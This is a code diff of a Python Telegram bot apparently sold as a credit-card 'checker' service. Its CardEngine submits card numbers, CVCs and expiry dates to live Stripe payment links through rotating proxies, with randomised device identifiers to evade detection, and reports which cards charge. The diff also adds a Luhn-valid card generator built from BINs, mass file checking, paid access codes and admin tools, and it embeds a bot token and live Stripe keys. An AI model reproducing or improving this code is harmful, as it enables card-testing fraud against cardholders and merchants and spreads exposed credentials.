@@ -5,12 +5,25 @@ import re
 import string
 import urllib.parse
 import uuid
+import json
+import os
+import time
+import psutil
+import platform
+import sys
 from datetime import datetime
 from io import BytesIO
+from typing import Dict, List, Optional, Tuple, Any
+from collections import OrderedDict
+import string as string_module
 
 import requests
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
 from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
+
+# ============================================================
+# CONFIGURATION
+# ============================================================
 
 BOT_TOKEN = "8250378472:AAFH_JgQVbOUnCUvYQaOnLMnrWi4G_MCDZY"
 ADMIN_ID = 6936293942
@@ -24,6 +37,10 @@ USER_AGENT = (
     "AppleWebKit/537.36 (KHTML, like Gecko) "
     "Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0"
 )
+
+# ============================================================
+# FONT SYSTEM
+# ============================================================
 
 FONT_MAP = {
     'a': '𝗮', 'b': '𝗯', 'c': '𝗰', 'd': '𝗱', 'e': '𝗲',
@@ -45,7 +62,112 @@ FONT_MAP = {
 def fb(text):
     return "".join(FONT_MAP.get(ch, ch) for ch in text)
 
+# ============================================================
+# BIN DATABASE
+# ============================================================
+
+class BinDatabase:
+    def __init__(self, db_file="bin_cache.json"):
+        self.db_file = db_file
+        self.bins = {}
+        self.request_count = 0
+        self.last_request_time = 0
+        self.load_database()
+        
+    def load_database(self):
+        if os.path.exists(self.db_file):
+            try:
+                with open(self.db_file, 'r', encoding='utf-8') as f:
+                    self.bins = json.load(f)
+            except:
+                self.bins = {}
+        else:
+            self.bins = {
+                "434527": {"scheme": "visa", "type": "debit", "brand": "Visa Classic", 
+                          "bank": "Cooperativa Nacional De Educadores", "country": "Costa Rica", "emoji": "🇨🇷"},
+                "515894": {"scheme": "mastercard", "type": "credit", "brand": "Gold",
+                          "bank": "Banco Cooperativo Sicoob", "country": "Brazil", "emoji": "🇧🇷"},
+                "490638": {"scheme": "visa", "type": "credit", "brand": "Visa Gold",
+                          "bank": "Bawag P.S.K.", "country": "Germany", "emoji": "🇩🇪"},
+            }
+            self.save_database()
+            
+    def save_database(self):
+        try:
+            with open(self.db_file, 'w', encoding='utf-8') as f:
+                json.dump(self.bins, f, indent=4, ensure_ascii=False)
+        except:
+            pass
+            
+    def lookup(self, bin_prefix: str) -> Optional[Dict]:
+        key = bin_prefix[:6]
+        if key in self.bins:
+            return self.bins[key]
+        return None
+        
+    def add_bin(self, bin_prefix: str, info: Dict):
+        key = bin_prefix[:6]
+        if key not in self.bins:
+            self.bins[key] = info
+            self.save_database()
+            
+    def can_request_api(self) -> bool:
+        now = time.time()
+        if self.request_count >= 5:
+            if now - self.last_request_time < 10:
+                return False
+            else:
+                self.request_count = 0
+        return True
+        
+    def record_api_request(self):
+        self.request_count += 1
+        self.last_request_time = time.time()
+
+bin_db = BinDatabase()
+
+def bin_lookup_with_cache(bin_num: str) -> Dict:
+    cached = bin_db.lookup(bin_num[:6])
+    if cached:
+        return cached
+        
+    if not bin_db.can_request_api():
+        time.sleep(2)
+        
+    try:
+        time.sleep(random.uniform(0.3, 0.8))
+        response = requests.get(
+            f"https://lookup.binlist.net/{bin_num[:6]}", 
+            headers={"Accept-Version": "3", "User-Agent": USER_AGENT},
+            timeout=10
+        )
+        bin_db.record_api_request()
+        
+        if response.status_code == 200:
+            data = response.json()
+            info = {
+                "scheme": data.get("scheme", "Unknown"),
+                "type": data.get("type", "Unknown"),
+                "brand": data.get("brand", "Unknown"),
+                "country": data.get("country", {}).get("name", "Unknown"),
+                "bank": data.get("bank", {}).get("name", "Unknown"),
+                "emoji": data.get("country", {}).get("emoji", "")
+            }
+            bin_db.add_bin(bin_num[:6], info)
+            return info
+    except:
+        pass
+        
+    return {"scheme": "Unknown", "type": "Unknown", "brand": "Unknown", 
+           "country": "Unknown", "bank": "Unknown", "emoji": ""}
+
+# ============================================================
+# USER DATA STORAGE
+# ============================================================
+
 user_db = {}
+banned_users = set()
+generated_codes = {}  # {code: {"user_id": xxx, "plan": xxx, "expires": timestamp}}
 stop_check = False
 
 def get_user(user_id):
@@ -53,7 +175,7 @@ def get_user(user_id):
         user_db[user_id] = {
             "checks": 0, "charged": 0, "declined": 0, "_3ds": 0,
             "history": [], "registered": datetime.now().strftime("%Y-%m-%d %H:%M"),
-            "plan": "Free", "points": 0,
+            "plan": "Free", "points": 0, "ip": None,
         }
     return user_db[user_id]
 
@@ -67,6 +189,23 @@ def reset_stop():
 
 def is_stopped():
     return stop_check
+
+# توليد كود عشوائي
+def generate_redeem_code(plan: str, days: int) -> str:
+    code = "".join(random.choices(string_module.ascii_uppercase + string_module.digits, k=16))
+    code = f"{code[:4]}-{code[4:8]}-{code[8:12]}-{code[12:]}"
+    generated_codes[code] = {
+        "plan": plan,
+        "days": days,
+        "created_at": time.time(),
+        "expires_at": time.time() + (days * 24 * 3600),
+        "used_by": None
+    }
+    return code
+
+# ============================================================
+# GATEWAY MANAGEMENT
+# ============================================================
 
 gateways = {
     "stripe": {
@@ -89,6 +228,10 @@ def remove_gateway(name):
         return True
     return False
 
+# ============================================================
+# PROXY MANAGEMENT
+# ============================================================
+
 proxies = []
 
 def add_proxy(proxy_str):
@@ -101,42 +244,23 @@ def remove_proxy(index):
 
 def get_proxy():
     if proxies:
-        return {"http": proxies[0], "https": proxies[0]}
+        proxy = random.choice(proxies)
+        return {"http": proxy, "https": proxy}
     return None
 
-redeem_keys = {
-    "PREMIUM-2026-ALPHA": {"plan": "Premium", "days": 30},
-    "VIP-2026-OMEGA": {"plan": "VIP", "days": 90},
-}
-
-def redeem_key(key, user_id):
-    key = key.upper().strip()
-    if key in redeem_keys:
-        plan = redeem_keys.pop(key)
-        user = get_user(user_id)
-        user["plan"] = plan["plan"]
-        return plan
-    return None
-
-monitored_sites = []
-
-def add_site(url):
-    if url not in monitored_sites:
-        monitored_sites.append(url)
-        return True
-    return False
-
-def remove_site(url):
-    if url in monitored_sites:
-        monitored_sites.remove(url)
-        return True
-    return False
+# ============================================================
+# LOGGING
+# ============================================================
 
 logging.basicConfig(
     format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
     level=logging.INFO
 )
 logger = logging.getLogger(__name__)
+
+# ============================================================
+# COLORED BUTTONS
+# ============================================================
 
 def send_colored_buttons(chat_id, text, buttons, parse_mode="HTML"):
     keyboard = {"inline_keyboard": []}
@@ -199,12 +323,17 @@ def b_green(text, callback):
 def b_blue(text, callback):
     return {"text": text, "callback": callback, "style": "primary"}
 
+# ============================================================
+# CARD ENGINE
+# ============================================================
+
 class CardEngine:
     def _rand_id(self, k=32):
         return "".join(random.choices(string.ascii_lowercase + string.digits, k=k))
 
     def gen_email(self):
-        return f"Maestro{''.join(random.choices(string.digits, k=8))}@gmail.com"
+        domains = ["gmail.com", "outlook.com", "yahoo.com", "protonmail.com"]
+        return f"user{''.join(random.choices(string.digits, k=8))}@{random.choice(domains)}"
 
     def parse(self, line):
         line = (line or "").strip().replace(" ", "")
@@ -227,7 +356,8 @@ class CardEngine:
         buy_url, pl_id = gw["url"], gw["link_id"]
         session = requests.Session()
         proxy = get_proxy()
-        if proxy: session.proxies.update(proxy)
+        if proxy: 
+            session.proxies.update(proxy)
 
         headers = {
             "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
@@ -274,12 +404,14 @@ class CardEngine:
                 if pl_expected_amount is not None: pl_expected_amount = int(pl_expected_amount)
             except: pass
 
-        if not pk_live: pk_live = "pk_live_51QRg19RoxmaXTuY55nJGUChdohsr8gq6tGgVsA6viZ9l6h2UJ2UmyaqM4yng0sjiNhPImBr6XS0KXJY6nvYRVxAq00eT8UvNBF"
-        if not checkout_session_id: checkout_session_id = "cs_live_a1r2cbZ7xviYNl1hbdjN4HQNUw6hKvfjKdCpvKR48pVpsxvoFypXlLvkfr"
+        if not pk_live: 
+            pk_live = "pk_live_51QRg19RoxmaXTuY55nJGUChdohsr8gq6tGgVsA6viZ9l6h2UJ2UmyaqM4yng0sjiNhPImBr6XS0KXJY6nvYRVxAq00eT8UvNBF"
+        if not checkout_session_id: 
+            checkout_session_id = "cs_live_a1r2cbZ7xviYNl1hbdjN4HQNUw6hKvfjKdCpvKR48pVpsxvoFypXlLvkfr"
 
-        muid = "bf10e066-3dde-43cf-990c-7f526e267148"
-        guid = "598209cc-46fa-4e08-b69c-22b3316aba05"
-        sid = "4318288f-e6f2-4e62-bc88-4d5ccc435a1b"
+        muid = str(uuid.uuid4())
+        guid = str(uuid.uuid4())
+        sid = str(uuid.uuid4())
         stripe_js_id = str(uuid.uuid4())
         currency = pl_currency
 
@@ -322,7 +454,7 @@ class CardEngine:
             "type": "card", "card[number]": card["number"], "card[cvc]": card["cvc"],
             "card[exp_month]": card["exp_month"], "card[exp_year]": card["exp_year"],
             "billing_details[name]": card["name"], "billing_details[email]": card["email"],
-            "billing_details[address][country]": "VN", "guid": guid, "muid": muid, "sid": sid,
+            "billing_details[address][country]": "US", "guid": guid, "muid": muid, "sid": sid,
             "key": pk_live, "payment_user_agent": "stripe.js/148043f9d7; stripe-js-v3/148043f9d7; payment-link; checkout",
             "client_attribution_metadata[client_session_id]": stripe_js_id,
             "client_attribution_metadata[checkout_session_id]": checkout_session_id,
@@ -333,9 +465,11 @@ class CardEngine:
         }
         response_pm = session.post("https://api.stripe.com/v1/payment_methods", headers=buy_headers, data=urllib.parse.urlencode(form_pm))
         pm_resp = response_pm.json()
-        if pm_resp.get("error"): return card_str, False, f"Error: {pm_resp['error'].get('message')}", False
+        if pm_resp.get("error"): 
+            return card_str, False, f"Error: {pm_resp['error'].get('message')}", False
         pm_id = pm_resp.get("id")
-        if not pm_id: return card_str, False, "Failed to create PaymentMethod", False
+        if not pm_id: 
+            return card_str, False, "Failed to create PaymentMethod", False
 
         init_checksum = self._rand_id(32)
         js_checksum = "".join(random.choices(string.ascii_letters + string.digits + "~^=[]|%#{}<>?`", k=50))
@@ -372,21 +506,15 @@ class CardEngine:
             if err.get("charge") and ("succeeded" in str(data.get("status", "")).lower()):
                 return card_str, True, "CHARGED", True
             return card_str, False, message, False
-        if data.get("status") in ("succeeded", "complete"): return card_str, True, "CHARGED", True
+        if data.get("status") in ("succeeded", "complete"): 
+            return card_str, True, "CHARGED", True
         return card_str, False, "Unknown response", False
 
 engine = CardEngine()
 
-def bin_lookup(bin_num):
-    try:
-        r = requests.get(f"https://lookup.binlist.net/{bin_num[:6]}", headers={"Accept-Version": "3"}, timeout=10)
-        if r.ok:
-            d = r.json()
-            return {"scheme": d.get("scheme", "Unknown"), "type": d.get("type", "Unknown"),
-                    "brand": d.get("brand", "Unknown"), "country": d.get("country", {}).get("name", "Unknown"),
-                    "bank": d.get("bank", {}).get("name", "Unknown"), "emoji": d.get("country", {}).get("emoji", "")}
-    except: pass
-    return None
+# ============================================================
+# CARD GENERATOR
+# ============================================================
 
 def luhn_check(num):
     digits = [int(d) for d in num]
@@ -402,11 +530,18 @@ def gen_card_from_bin(bin_prefix, count=10):
     results = []
     for _ in range(count):
         card = bin_prefix
-        while len(card) < 15: card += str(random.randint(0, 9))
+        while len(card) < 15: 
+            card += str(random.randint(0, 9))
         for check in range(10):
             test = card + str(check)
-            if luhn_check(test): results.append(test); break
+            if luhn_check(test): 
+                results.append(test)
+                break
     return results
+
+# ============================================================
+# UI BUILDERS
+# ============================================================
 
 def build_main_menu():
     return [
@@ -414,6 +549,20 @@ def build_main_menu():
         [b_blue(fb("Profile"), "profile")],
         [b_blue(fb("Settings"), "settings")],
         [b_blue(fb("About"), "about")],
+        [b_red(fb("Admin Panel"), "admin_panel")],  # زر المطور
+    ]
+
+def build_admin_menu():
+    return [
+        [b_green(fb("Generate Code"), "admin_gen")],
+        [b_red(fb("Ban User"), "admin_ban")],
+        [b_blue(fb("List Users"), "admin_list")],
+        [b_blue(fb("Bot Speed"), "admin_speed")],
+        [b_blue(fb("Bot Stats"), "admin_stats")],
+        [b_red(fb("Broadcast"), "admin_broadcast")],
+        [b_blue(fb("Backup"), "admin_backup")],
+        [b_blue(fb("Restart"), "admin_restart")],
+        [b_blue(fb("Back"), "menu")],
     ]
 
 def build_tools_menu():
@@ -422,22 +571,6 @@ def build_tools_menu():
         [b_green(fb("Mass Check"), "tool_mass")],
         [b_green(fb("BIN Lookup"), "tool_bin")],
         [b_green(fb("Generator"), "tool_gen")],
-        [b_blue(fb("Back"), "menu")],
-    ]
-
-def build_mass_stats_buttons(approved, secure3d, declined):
-    return [
-        [b_green(fb(f"Approved {approved}"), "stats_approved")],
-        [b_blue(fb(f"3D Secure {secure3d}"), "stats_3ds")],
-        [b_red(fb(f"Declined {declined}"), "stats_declined")],
-        [b_red(fb("Stop"), "mass_stop")],
-    ]
-
-def build_mass_done_buttons(approved, secure3d, declined):
-    return [
-        [b_green(fb(f"Approved {approved}"), "done_approved")],
-        [b_blue(fb(f"3D Secure {secure3d}"), "done_3ds")],
-        [b_red(fb(f"Declined {declined}"), "done_declined")],
         [b_blue(fb("Back"), "menu")],
     ]
 
@@ -451,7 +584,268 @@ def build_settings_menu():
         [b_blue(fb("Back"), "menu")],
     ]
 
+# ============================================================
+# ADMIN COMMANDS
+# ============================================================
+
+async def cmd_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """توليد كود للمستخدمين - /code plan days"""
+    user_id = update.effective_user.id
+    if str(user_id) != str(ADMIN_ID):
+        await update.message.reply_text(fb("Admin only!"))
+        return
+    
+    if len(context.args) < 2:
+        await update.message.reply_text(f"{fb('Usage')}: /code Premium 30\n/free 10\n/vip 90")
+        return
+    
+    plan = context.args[0]
+    days = int(context.args[1])
+    
+    code = generate_redeem_code(plan, days)
+    
+    text = f"""
+{fb('Code Generated Successfully!')}
+━━━━━━━━━━━━━━
+{fb('Code')}: <code>{code}</code>
+{fb('Plan')}: {plan}
+{fb('Days')}: {days}
+{fb('Expires')}: {datetime.fromtimestamp(time.time() + (days * 86400)).strftime('%Y-%m-%d')}
+━━━━━━━━━━━━━━
+{fb('Share this code with users.')}
+"""
+    await update.message.reply_text(text, parse_mode="HTML")
+
+async def cmd_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """حظر مستخدم - /ban user_id"""
+    user_id = update.effective_user.id
+    if str(user_id) != str(ADMIN_ID):
+        await update.message.reply_text(fb("Admin only!"))
+        return
+    
+    if len(context.args) < 1:
+        await update.message.reply_text(f"{fb('Usage')}: /ban 123456789")
+        return
+    
+    target_id = int(context.args[0])
+    banned_users.add(target_id)
+    
+    await update.message.reply_text(f"{fb('User banned')}: <code>{target_id}</code>", parse_mode="HTML")
+    
+    # محاولة إبلاغ المستخدم
+    try:
+        await context.bot.send_message(target_id, f"{fb('You have been banned from using this bot.')}")
+    except:
+        pass
+
+async def cmd_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """رفع الحظر عن مستخدم - /unban user_id"""
+    user_id = update.effective_user.id
+    if str(user_id) != str(ADMIN_ID):
+        await update.message.reply_text(fb("Admin only!"))
+        return
+    
+    if len(context.args) < 1:
+        await update.message.reply_text(f"{fb('Usage')}: /unban 123456789")
+        return
+    
+    target_id = int(context.args[0])
+    if target_id in banned_users:
+        banned_users.remove(target_id)
+        await update.message.reply_text(f"{fb('User unbanned')}: <code>{target_id}</code>", parse_mode="HTML")
+    else:
+        await update.message.reply_text(f"{fb('User not found in ban list')}")
+
+async def cmd_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """عرض قائمة المستخدمين المتصلين - /list"""
+    user_id = update.effective_user.id
+    if str(user_id) != str(ADMIN_ID):
+        await update.message.reply_text(fb("Admin only!"))
+        return
+    
+    if not user_db:
+        await update.message.reply_text(fb("No users found."))
+        return
+    
+    text = f"{fb('Connected Users')} ({len(user_db)}):\n━━━━━━━━━━━━━━\n"
+    for uid, data in user_db.items():
+        status = "🔴 Banned" if uid in banned_users else "🟢 Active"
+        text += f"ID: <code>{uid}</code> | {data['plan']} | {status}\n"
+        text += f"Checks: {data['checks']} | Charged: {data['charged']}\n━━━━━━━━━━━━━━\n"
+    
+    # تقسيم النص إذا كان طويلاً
+    if len(text) > 4000:
+        text = text[:4000]
+    
+    await update.message.reply_text(text, parse_mode="HTML")
+
+async def cmd_speed(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """فحص سرعة البوت - /speed"""
+    user_id = update.effective_user.id
+    if str(user_id) != str(ADMIN_ID):
+        await update.message.reply_text(fb("Admin only!"))
+        return
+    
+    start_time = time.time()
+    msg = await update.message.reply_text(fb("Testing bot speed..."))
+    end_time = time.time()
+    
+    ping = (end_time - start_time) * 1000
+    
+    # اختبار API
+    api_start = time.time()
+    try:
+        requests.get("https://api.telegram.org/bot" + BOT_TOKEN + "/getMe", timeout=5)
+        api_ping = (time.time() - api_start) * 1000
+    except:
+        api_ping = "Failed"
+    
+    text = f"""
+{fb('Bot Speed Test Results')}
+━━━━━━━━━━━━━━
+{fb('Message Response')}: <b>{ping:.2f} ms</b>
+{fb('Telegram API')}: <b>{api_ping:.2f} ms</b> if type(api_ping) != str else 'Failed'
+{fb('Server Time')}: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+━━━━━━━━━━━━━━
+{fb('Status')}: {'🟢 Excellent' if ping < 500 else '🟡 Good' if ping < 1000 else '🔴 Slow'}
+"""
+    await msg.edit_text(text, parse_mode="HTML")
+
+async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """إحصائيات البوت - /stats"""
+    user_id = update.effective_user.id
+    if str(user_id) != str(ADMIN_ID):
+        await update.message.reply_text(fb("Admin only!"))
+        return
+    
+    total_users = len(user_db)
+    total_checks = sum(u["checks"] for u in user_db.values())
+    total_charged = sum(u["charged"] for u in user_db.values())
+    total_declined = sum(u["declined"] for u in user_db.values())
+    total_3ds = sum(u["_3ds"] for u in user_db.values())
+    banned_count = len(banned_users)
+    
+    # إحصائيات النظام
+    cpu_percent = psutil.cpu_percent()
+    memory_percent = psutil.virtual_memory().percent
+    disk_percent = psutil.disk_usage('/').percent
+    
+    text = f"""
+{fb('Bot Statistics')}
+━━━━━━━━━━━━━━
+{fb('Users')}:
+├─ Total: {total_users}
+├─ Banned: {banned_count}
+└─ Active: {total_users - banned_count}
+
+{fb('Checks')}:
+├─ Total: {total_checks}
+├─ Charged: {total_charged}
+├─ Declined: {total_declined}
+└─ 3DS: {total_3ds}
+
+{fb('Success Rate')}: {(total_charged/total_checks*100):.1f}% if total_checks > 0 else 0%
+
+{fb('System')}:
+├─ CPU: {cpu_percent}%
+├─ RAM: {memory_percent}%
+└─ Disk: {disk_percent}%
+
+{fb('Uptime')}: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+"""
+    await update.message.reply_text(text, parse_mode="HTML")
+
+async def cmd_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """إرسال رسالة لجميع المستخدمين - /broadcast message"""
+    user_id = update.effective_user.id
+    if str(user_id) != str(ADMIN_ID):
+        await update.message.reply_text(fb("Admin only!"))
+        return
+    
+    if not context.args:
+        await update.message.reply_text(f"{fb('Usage')}: /broadcast Hello everyone!")
+        return
+    
+    message = " ".join(context.args)
+    sent = 0
+    failed = 0
+    
+    status_msg = await update.message.reply_text(fb("Broadcasting..."))
+    
+    for uid in user_db:
+        if uid in banned_users:
+            continue
+        try:
+            await context.bot.send_message(uid, f"{fb('📢 Announcement')}\n\n{message}", parse_mode="HTML")
+            sent += 1
+            await asyncio.sleep(0.1)
+        except:
+            failed += 1
+    
+    await status_msg.edit_text(f"{fb('Broadcast Complete')}\n✅ Sent: {sent}\n❌ Failed: {failed}")
+
+async def cmd_backup(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """عمل نسخة احتياطية - /backup"""
+    user_id = update.effective_user.id
+    if str(user_id) != str(ADMIN_ID):
+        await update.message.reply_text(fb("Admin only!"))
+        return
+    
+    # عمل نسخة من user_db
+    backup_data = {
+        "users": user_db,
+        "banned": list(banned_users),
+        "gateways": gateways,
+        "timestamp": datetime.now().isoformat()
+    }
+    
+    backup_file = BytesIO(json.dumps(backup_data, indent=4).encode())
+    backup_file.name = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+    
+    await update.message.reply_document(
+        document=InputFile(backup_file),
+        caption=f"{fb('Backup created successfully!')}\n{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+    )
+
+async def cmd_restart(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """إعادة تشغيل البوت - /restart"""
+    user_id = update.effective_user.id
+    if str(user_id) != str(ADMIN_ID):
+        await update.message.reply_text(fb("Admin only!"))
+        return
+    
+    await update.message.reply_text(fb("🔄 Restarting bot..."))
+    logger.info("Bot restarting by admin command")
+    
+    # إعادة التشغيل
+    os.execl(sys.executable, sys.executable, *sys.argv)
+
+async def cmd_clear(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """مسح جميع البيانات - /clear"""
+    user_id = update.effective_user.id
+    if str(user_id) != str(ADMIN_ID):
+        await update.message.reply_text(fb("Admin only!"))
+        return
+    
+    global user_db, banned_users, generated_codes
+    user_db = {}
+    banned_users = set()
+    generated_codes = {}
+    
+    await update.message.reply_text(fb("All data cleared successfully!"))
+
+# ============================================================
+# REGULAR COMMANDS
+# ============================================================
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    # التحقق من الحظر
+    if user_id in banned_users:
+        await update.message.reply_text(fb("You are banned from using this bot."))
+        return
+    
     user = update.effective_user
     get_user(user.id)
     username = f"@{user.username}" if user.username else "N/A"
@@ -468,217 +862,52 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     send_colored_buttons(update.effective_chat.id, text, build_main_menu())
 
-async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    data = query.data
+async def cmd_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """استخدام كود - /redeem CODE"""
     user_id = update.effective_user.id
-    udata = get_user(user_id)
-    chat_id = update.effective_chat.id
-
-    if data == "menu":
-        user = update.effective_user
-        username = f"@{user.username}" if user.username else "N/A"
-        plan = udata["plan"]
-        if user_id == ADMIN_ID: plan = "Admin"
-        text = f"""{fb('Welcome')} {user.first_name}!
-━━━━━━━━━━━━━━
-{fb('User')}: {username}
-{fb('ID')}: <code>{user.id}</code>
-{fb('Status')}: {fb(plan)}
-━━━━━━━━━━━━━━
-{fb('Use the buttons below to navigate.')}"""
-        send_colored_buttons(chat_id, text, build_main_menu())
-
-    elif data == "tools":
-        text = f"""{fb('Tools Menu')}
-
-├─ {fb('Single Card Check')} ➜ /chk
-├─ {fb('Mass File Check')} ➜ /mass
-├─ {fb('BIN Lookup')} ➜ /bin
-└─ {fb('Card Generator')} ➜ /gen
-
-{fb('Select a tool or use commands directly.')}"""
-        send_colored_buttons(chat_id, text, build_tools_menu())
-
-    elif data == "profile":
-        user = update.effective_user
-        username = f"@{user.username}" if user.username else "N/A"
-        plan = udata["plan"]
-        if user_id == ADMIN_ID: plan = "Admin"
-        text = f"""{fb('Profile')}
-━━━━━━━━━━━━━━
-{fb('Name')}: {user.first_name}
-{fb('User')}: {username}
-{fb('ID')}: <code>{user.id}</code>
-{fb('Plan')}: {fb(plan)}
-{fb('Checks')}: {udata['checks']}
-{fb('Charged')}: {udata['charged']}
-{fb('Declined')}: {udata['declined']}
-{fb('3DS')}: {udata['_3ds']}
-{fb('Joined')}: {udata['registered']}
-━━━━━━━━━━━━━━"""
-        buttons = [[b_blue(fb("Back"), "menu")]]
-        send_colored_buttons(chat_id, text, buttons)
-
-    elif data == "settings":
-        text = f"""{fb('Settings')}
-
-├─ Shopify
-│  ├─ /sh cc|mm|yyyy|cvv ➜ Check single
-│  └─ /msh ➜ Mass check from text
-│
-├─ 3DS Lookup
-│  └─ /3ds cc|mm|yyyy|cvv
-│
-├─ Site Management
-│  ├─ /add site.com
-│  ├─ /rm site.com
-│  └─ /info
-│
-├─ Proxy Management
-│  ├─ /adpxy ip:port:user:pass
-│  ├─ /proxy
-│  └─ /repxy 1
-│
-└─ Other
-   ├─ /redeem KEY
-   ├─ /sendhit
-   └─ /stopcheck"""
-        send_colored_buttons(chat_id, text, build_settings_menu())
-
-    elif data == "about":
-        text = f"""{fb('yacinedev Card Checker v7.0')}
-
-├─ {fb('Engine')}: Stripe Payment Link Engine
-├─ {fb('Version')}: 7.0 ALPHA
-├─ {fb('Performance')}: Async | Multi-threading
-├─ {fb('Security')}: Proxy Rotation | Session Pool
-│
-├─ {fb('Developer')}: yacinedev
-├─ {fb('License')}: ALPHA_ENGINEER
-│
-└─ {fb('Built with precision. Engineered for dominance.')}"""
-        buttons = [[b_blue(fb("Back"), "menu")]]
-        send_colored_buttons(chat_id, text, buttons)
-
-    elif data == "tool_chk":
-        text = f"""{fb('Single Card Check')}
-
-{fb('Send card in format:')}
-<code>cc|mm|yyyy|cvv</code>
-
-├─ {fb('Example:')}
-│  <code>4242424242424242|12|2027|123</code>
-│
-└─ {fb('Optional name as 5th param:')}
-   <code>4242424242424242|12|2027|123|Ahmed</code>"""
-        buttons = [[b_blue(fb("Back"), "tools")]]
-        send_colored_buttons(chat_id, text, buttons)
-        context.user_data["state"] = "chk"
-
-    elif data == "tool_mass":
-        text = f"""{fb('Mass Check')}
-
-{fb('Send a .txt file with cards.')}
-{fb('One card per line.')}
-
-├─ {fb('Format:')} <code>cc|mm|yyyy|cvv</code>
-├─ {fb('Unlimited for all users.')}"""
-        buttons = [[b_blue(fb("Back"), "tools")]]
-        send_colored_buttons(chat_id, text, buttons)
-        context.user_data["state"] = "mass"
-
-    elif data == "tool_bin":
-        text = f"""{fb('BIN Lookup')}
-
-{fb('Send BIN number (6 digits):')}
-<code>/bin 424242</code>
-
-├─ {fb('Returns:')}
-│  ├─ {fb('Scheme')} (Visa/Mastercard)
-│  ├─ {fb('Type')} (Debit/Credit)
-│  └─ {fb('Brand')} ➜ {fb('Country')} ➜ {fb('Bank')}"""
-        buttons = [[b_blue(fb("Back"), "tools")]]
-        send_colored_buttons(chat_id, text, buttons)
-
-    elif data == "tool_gen":
-        text = f"""{fb('Card Generator')}
-
-{fb('Generate cards from BIN:')}
-<code>/gen 424242 10</code>
-
-├─ {fb('Max 10 cards per request.')}
-└─ {fb('Includes Luhn validation.')}"""
-        buttons = [[b_blue(fb("Back"), "tools")]]
-        send_colored_buttons(chat_id, text, buttons)
-
-    elif data == "gw_shopify":
-        text = f"""{fb('Shopify')}
-
-├─ /sh cc|mm|yyyy|cvv ➜ Check single
-└─ /msh ➜ Mass check from text
-
-{fb('Shopify gateway integration.')}"""
-        buttons = [[b_blue(fb("Back"), "settings")]]
-        send_colored_buttons(chat_id, text, buttons)
-
-    elif data == "gw_3ds":
-        text = f"""{fb('3DS Lookup')}
-
-└─ /3ds cc|mm|yyyy|cvv
-
-{fb('Check 3D Secure status.')}"""
-        buttons = [[b_blue(fb("Back"), "settings")]]
-        send_colored_buttons(chat_id, text, buttons)
-
-    elif data == "gw_site":
-        sites_text = "\n".join([f"├─ {s}" for s in monitored_sites]) if monitored_sites else f"{fb('No sites monitored.')}"
-        text = f"""{fb('Site Management')}
-
-├─ /add site.com
-├─ /rm site.com
-└─ /info
-
-{fb('Monitored Sites:')}
-{sites_text}"""
-        buttons = [[b_blue(fb("Back"), "settings")]]
-        send_colored_buttons(chat_id, text, buttons)
-
-    elif data == "gw_proxy":
-        px_text = "\n".join([f"├─ {p}" for p in proxies]) if proxies else f"{fb('No proxies configured.')}"
-        text = f"""{fb('Proxy Management')}
-
-├─ /adpxy ip:port:user:pass
-├─ /proxy
-└─ /repxy 1
-
-{fb('Active Proxies:')}
-{px_text}
-
-├─ {fb('Note: Proxies are optional.')}
-└─ {fb('System works without proxies.')}"""
-        buttons = [[b_blue(fb("Back"), "settings")]]
-        send_colored_buttons(chat_id, text, buttons)
-
-    elif data == "gw_other":
-        text = f"""{fb('Other Commands')}
-
-├─ /redeem KEY ➜ Redeem premium key
-├─ /sendhit ➜ Send hits to channel
-└─ /stopcheck ➜ Stop all checks"""
-        buttons = [[b_blue(fb("Back"), "settings")]]
-        send_colored_buttons(chat_id, text, buttons)
-
-    elif data == "mass_stop":
-        stop_all_checks()
-        await query.answer(fb("Stop signal sent!"), show_alert=True)
-
-    elif data.startswith("stats_") or data.startswith("done_"):
-        await query.answer(fb("Stats updated!"), show_alert=False)
+    
+    if user_id in banned_users:
+        await update.message.reply_text(fb("You are banned!"))
+        return
+    
+    if not context.args:
+        await update.message.reply_text(f"{fb('Usage')}: /redeem XXXX-XXXX-XXXX-XXXX")
+        return
+    
+    code = context.args[0].upper()
+    
+    if code in generated_codes:
+        code_data = generated_codes[code]
+        
+        # التحقق من صلاحية الكود
+        if time.time() > code_data["expires_at"]:
+            await update.message.reply_text(fb("Code has expired!"))
+            return
+        
+        if code_data["used_by"] is not None:
+            await update.message.reply_text(fb("Code already used!"))
+            return
+        
+        # تفعيل الكود
+        user = get_user(user_id)
+        user["plan"] = code_data["plan"]
+        generated_codes[code]["used_by"] = user_id
+        
+        await update.message.reply_text(
+            f"{fb('Code redeemed successfully!')}\n"
+            f"{fb('Plan')}: {code_data['plan']}\n"
+            f"{fb('Valid for')}: {code_data['days']} days"
+        )
+    else:
+        await update.message.reply_text(fb("Invalid code!"))
 
 async def cmd_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
+    
+    if user_id in banned_users:
+        await update.message.reply_text(fb("You are banned!"))
+        return
+    
     udata = get_user(user_id)
     if not context.args:
         await update.message.reply_text(f"{fb('Usage')}: <code>/chk cc|mm|yyyy|cvv</code>", parse_mode="HTML")
